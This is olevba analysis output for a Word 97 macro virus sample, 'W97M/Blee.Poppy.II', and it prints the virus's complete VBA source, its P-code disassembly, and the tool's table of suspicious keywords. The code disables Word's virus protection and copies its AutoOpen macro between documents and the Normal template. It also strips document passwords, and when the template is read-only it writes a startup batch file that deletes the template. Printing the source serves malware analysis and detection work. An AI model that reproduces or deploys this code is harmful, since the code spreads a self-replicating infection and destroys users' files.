olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Poppy.d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()

'W97M/Blee.Poppy.II
'this is version II(ES) (with no blee payload)
'By VicodinES
'Macro Virus for Word 97
'"Sloppy Code For A Sloppy Red Mess"

Const Saturday As Integer = 7

Randomize

fm = Int(Rnd * 3) + 2

Mrn1 = Int(Rnd * 8) + 1
Mrn2 = Int(Rnd * 8) + 1

Brn = Int(Rnd * 100) + 1

If Mrn1 = Mrn2 Then Mrn2 = Mrn2 + 1
If Mrn2 > 8 Then Mrn2 = 0

For X = 1 To 2

If X = 1 Then MrnC = Mrn1
If X = 2 Then MrnC = Mrn2

If MrnC = 0 Then renameC$ = "HelpAbout"
If MrnC = 1 Then renameC$ = "AutoClose"
If MrnC = 2 Then renameC$ = "FileTemplates"
If MrnC = 3 Then renameC$ = "ToolsMacro"
If MrnC = 4 Then renameC$ = "AutoOpen"
If MrnC = 5 Then renameC$ = "AutoExit"
If MrnC = 6 Then renameC$ = "AutoExec"
If MrnC = 7 Then renameC$ = "ViewVBCode"
If MrnC = 8 Then renameC$ = "ToolsOptions"

If X = 1 Then rename$ = renameC$
If X = 2 Then rename1$ = renameC$

Next X

With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
    
    msfile$ = "c:\windows\startm~1\programs\startup\msfile.bat"

    ok = 0
    dork = 0
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    nfat = GetAttr(NormalTemplate.FullName)
    
    If nfat = vbReadOnly Then Call vBitchES(msfile$)
    If nfat = vbReadOnly + vbArchive Then Call vBitchES(msfile$)
 
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff

    If Soma$ = UCase(NormalTemplate) Then dork = 1
        
    If dork = 1 Then ao$ = WordBasic.[MacroName$](fm, 0) Else ao$ = "AutoOpen"
        
    If dork = 1 Then one$ = NormalTemplate.FullName Else one$ = ActiveDocument.FullName
        
    If dork = 1 Then two$ = ActiveDocument.FullName Else two$ = NormalTemplate.FullName
        
            If rename$ = "AutoOpen" Then backup$ = "VicodinES"
            If rename2$ = "AutoOpen" Then backup$ = "VicodinES"
            If ao$ = "AutoOpen" Then backup$ = "VicodinES"
            If backup$ <> "VicodinES" Then backup$ = "AutoOpen"

        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = backup$
            
            Application.OrganizerCopy Source:= _
        one$, Destination:= _
        two$, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
            
            Application.OrganizerRename Source:= _
        two$, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems

            Next X
            
            Application.OrganizerCopy Source:= _
        one$, Destination:= _
        two$, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
        If dork = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
        If dork = 0 Then
            If NormalTemplate.Saved = False Then NormalTemplate.Save
            
        End If
    
Today = WeekDay(Now())

If Today = Saturday Then MsgBox "VicodinES is probably high on painkillers right now"

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "VicodinES"
    .Title = "Another W97M/Blee.Poppy Infected Document"
    .Subject = "Macro Virus Infection by The Narkotic Network"
    .Comments = "Hello from VicodinES and The Narkotic Network ... we mean you no harm"
    .Execute
End With

    
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

GoTo fuckoff

Hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0

End Sub
Sub vBitchES(strFile As String)
 
 Dim hFile As Long

 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + msfile$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Poppy.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 10583 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub Main())
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0012 "W97M/Blee.Poppy.II"
' Line #4:
' 	QuoteRem 0x0000 0x002D "this is version II(ES) (with no blee payload)"
' Line #5:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #6:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #7:
' 	QuoteRem 0x0000 0x0023 ""Sloppy Code For A Sloppy Red Mess""
' Line #8:
' Line #9:
' 	Dim (Const) 
' 	LitDI2 0x0007 
' 	VarDefn Saturday (As Integer)
' Line #10:
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St fm 
' Line #14:
' Line #15:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn1 
' Line #16:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' Line #17:
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Brn 
' Line #19:
' Line #20:
' 	Ld Mrn1 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #21:
' 	Ld Mrn2 
' 	LitDI2 0x0008 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn2 
' 	EndIf 
' Line #22:
' Line #23:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #24:
' Line #25:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn1 
' 	St MrnC 
' 	EndIf 
' Line #26:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	St MrnC 
' 	EndIf 
' Line #27:
' Line #28:
' 	Ld MrnC 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "HelpAbout"
' 	St renameC$ 
' 	EndIf 
' Line #29:
' 	Ld MrnC 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "AutoClose"
' 	St renameC$ 
' 	EndIf 
' Line #30:
' 	Ld MrnC 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "FileTemplates"
' 	St renameC$ 
' 	EndIf 
' Line #31:
' 	Ld MrnC 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ToolsMacro"
' 	St renameC$ 
' 	EndIf 
' Line #32:
' 	Ld MrnC 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St renameC$ 
' 	EndIf 
' Line #33:
' 	Ld MrnC 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExit"
' 	St renameC$ 
' 	EndIf 
' Line #34:
' 	Ld MrnC 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExec"
' 	St renameC$ 
' 	EndIf 
' Line #35:
' 	Ld MrnC 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ViewVBCode"
' 	St renameC$ 
' 	EndIf 
' Line #36:
' 	Ld MrnC 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ToolsOptions"
' 	St renameC$ 
' 	EndIf 
' Line #37:
' Line #38:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld renameC$ 
' 	St rename$ 
' 	EndIf 
' Line #39:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld renameC$ 
' 	St rename1$ 
' 	EndIf 
' Line #40:
' Line #41:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' Line #43:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #44:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #45:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #46:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #47:
' 	EndWith 
' Line #48:
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' Line #51:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St msfile$ 
' Line #52:
' Line #53:
' 	LitDI2 0x0000 
' 	St ok 
' Line #54:
' 	LitDI2 0x0000 
' 	St dork 
' Line #55:
' Line #56:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Soma$ 
' Line #57:
' Line #58:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St nfat 
' Line #59:
' Line #60:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld msfile$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #61:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld msfile$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #62:
' Line #63:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #64:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #65:
' Line #66:
' 	Ld Soma$ 
' 	Ld NormalTemplate 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St dork 
' 	EndIf 
' Line #67:
' Line #68:
' 	Ld dork 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld fm 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St ao$ 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St ao$ 
' 	EndIf 
' Line #69:
' Line #70:
' 	Ld dork 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St one$ 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St one$ 
' 	EndIf 
' Line #71:
' Line #72:
' 	Ld dork 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St two$ 
' 	Else 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St two$ 
' 	EndIf 
' Line #73:
' Line #74:
' 	Ld rename$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #75:
' 	Ld rename2$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #76:
' 	Ld ao$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #77:
' 	Ld backup$ 
' 	LitStr 0x0009 "VicodinES"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St backup$ 
' 	EndIf 
' Line #78:
' Line #79:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #80:
' Line #81:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename$ 
' 	St Mac$ 
' 	EndIf 
' Line #82:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename2$ 
' 	St Mac$ 
' 	EndIf 
' Line #83:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld backup$ 
' 	St Mac$ 
' 	EndIf 
' Line #84:
' Line #85:
' 	LineCont 0x000C 05 00 08 00 09 00 08 00 11 00 08 00
' 	Ld one$ 
' 	ParamNamed Source 
' 	Ld two$ 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #86:
' Line #87:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 11 00 08 00
' 	Ld two$ 
' 	ParamNamed Source 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld Mac$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #88:
' Line #89:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' Line #91:
' 	LineCont 0x000C 05 00 08 00 09 00 08 00 11 00 08 00
' 	Ld one$ 
' 	ParamNamed Source 
' 	Ld two$ 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #92:
' Line #93:
' 	Ld dork 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #94:
' 	Ld dork 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #96:
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	St Today 
' Line #100:
' Line #101:
' 	Ld Today 
' 	Ld Saturday 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0033 "VicodinES is probably high on painkillers right now"
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #102:
' Line #103:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #104:
' 	LitStr 0x0009 "VicodinES"
' 	MemStWith Author 
' Line #105:
' 	LitStr 0x0029 "Another W97M/Blee.Poppy Infected Document"
' 	MemStWith Title 
' Line #106:
' 	LitStr 0x002D "Macro Virus Infection by The Narkotic Network"
' 	MemStWith Subject 
' Line #107:
' 	LitStr 0x0045 "Hello from VicodinES and The Narkotic Network ... we mean you no harm"
' 	MemStWith Comments 
' Line #108:
' 	ArgsMemCallWith Execute 0x0000 
' Line #109:
' 	EndWith 
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #114:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #115:
' 	LitStr 0x0000 ""
' 	MemStWith Password 
' Line #116:
' 	LitStr 0x0000 ""
' 	MemStWith WritePassword 
' Line #117:
' 	EndWith 
' Line #118:
' Line #119:
' 	GoTo fuckoff 
' Line #120:
' Line #121:
' 	Label Hell 
' Line #122:
' Line #123:
' 	Label fuckoff 
' Line #124:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #125:
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub vBitchES(strFile As String))
' Line #128:
' Line #129:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #130:
' Line #131:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #132:
' 	LitStr 0x0009 "@echo off"
' 	St Part1$ 
' Line #133:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #134:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #135:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #136:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #137:
' 	LitStr 0x0003 "cls"
' 	St Part33$ 
' Line #138:
' Line #139:
' 	Ld Friend 
' 	St hFile 
' Line #140:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #141:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #142:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #143:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #144:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #145:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #146:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #147:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld msfile$ 
' 	Add 
' 	PrintItemNL 
' Line #148:
' 	Ld hFile 
' 	Close 0x0001 
' Line #149:
' Line #150:
' 	GoTo Hell 
' Line #151:
' Line #152:
' 	Label Hell 
' Line #153:
' Line #154:
' 	EndSub 
' Line #155:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

